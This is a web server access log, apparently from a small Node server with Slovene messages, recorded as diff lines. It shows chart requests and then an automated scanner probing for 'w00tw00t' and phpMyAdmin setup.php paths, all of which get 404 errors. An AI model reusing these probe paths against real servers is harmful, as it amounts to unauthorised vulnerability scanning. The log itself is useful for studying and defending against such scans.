+2017-04-25T19:44:43.156Z Incoming Request from: 89.142.55.18 for href: /graf
+2017-04-25T19:44:43.191Z Incoming Request from: 89.142.55.18 for href: /chart.js
+2017-04-25T19:44:43.469Z Incoming Request from: 89.142.55.18 for href: /chart&d&nocache=495511.38653187454
+2017-04-25T19:44:47.593Z Incoming Request from: 89.142.55.18 for href: /chart&t&nocache=326790.77586802986
+2017-04-25T19:44:49.449Z Incoming Request from: 89.142.55.18 for href: /chart&m&nocache=113772.64081907812
+2017-04-25T19:44:51.228Z Incoming Request from: 89.142.55.18 for href: /chart&d&nocache=264823.2970758352
+2017-04-25T19:45:09.759Z Incoming Request from: 89.142.55.18 for href: /chart&t&nocache=790327.9931482557
+2017-04-25T19:45:10.172Z Incoming Request from: 89.142.55.18 for href: /chart&t&nocache=420695.1433980509
+2017-04-25T19:45:11.759Z Incoming Request from: 89.142.55.18 for href: /chart&d&nocache=409596.6061982712
+2017-04-25T19:45:12.049Z Incoming Request from: 89.142.55.18 for href: /chart&d&nocache=723803.9619811145
+2017-04-25T19:49:19.312Z Incoming Request from: 66.249.93.156 for href: /chart&d&nocache=831003.3808894187
+2017-04-25T20:55:01.744Z Incoming Request from: 80.82.64.21 for href: /w00tw00t.at.blackhats.romanian.anti-sec:)
+pošiljam 404 Error: ENOENT, open '/root/w00tw00t.at.blackhats.romanian.anti-sec:)'
+2017-04-25T20:55:01.853Z Incoming Request from: 80.82.64.21 for href: /phpMyAdmin/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/phpMyAdmin'
+2017-04-25T20:55:01.953Z Incoming Request from: 80.82.64.21 for href: /phpmyadmin/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/phpmyadmin'
+2017-04-25T20:55:02.064Z Incoming Request from: 80.82.64.21 for href: /pma/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/pma'
+2017-04-25T20:55:02.168Z Incoming Request from: 80.82.64.21 for href: /myadmin/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/myadmin'
+2017-04-25T20:55:02.266Z Incoming Request from: 80.82.64.21 for href: /MyAdmin/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/MyAdmin'
+2017-04-25T20:55:02.369Z Incoming Request from: 80.82.64.21 for href: /scripts/setup.php
+pošiljam 404 Error: EISDIR, read
